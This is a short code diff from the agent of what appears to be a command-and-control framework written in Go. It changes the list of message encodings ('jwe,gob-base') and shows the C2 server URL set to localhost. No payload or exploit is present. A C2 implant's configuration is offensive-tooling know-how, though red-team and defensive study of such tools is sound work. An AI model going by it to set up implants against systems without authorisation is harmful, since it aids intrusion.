@@ -93,7 +93,7 @@ var skew = "3000"
 
 // transforms is an ordered comma seperated list of transforms (encoding/encryption) to apply when constructing a message
 // that will be sent to the server
-var transforms = "gob-string,jwe,gob-base"
+var transforms = "jwe,gob-base"
 
 // url the protocol, address, and port of the Agent's command and control server to communicate with
 var url = "https://127.0.0.1:443"
